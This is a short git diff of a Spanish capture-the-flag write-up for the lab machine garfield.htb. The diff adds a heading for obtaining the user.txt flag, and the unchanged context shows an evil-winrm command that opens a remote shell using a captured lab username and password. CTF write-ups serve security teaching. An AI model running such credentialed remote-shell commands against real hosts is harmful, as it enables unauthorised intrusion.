@@ -258,6 +258,9 @@ Si la validación es correcta, se obtiene shell interactiva:
 ```bash
 evil-winrm -i garfield.htb -u l.wilson_adm -p 'WhoKnows123!'
 ```
+
+## 9. Obtención de la bandera del user.txt
+
 <img width="731" height="313" alt="Screenshot 2026-06-28 at 08 26 32" src="https://github.com/user-attachments/assets/e82f8612-1ccd-47d3-bb4c-ce6d75e08615" />
 
 ---
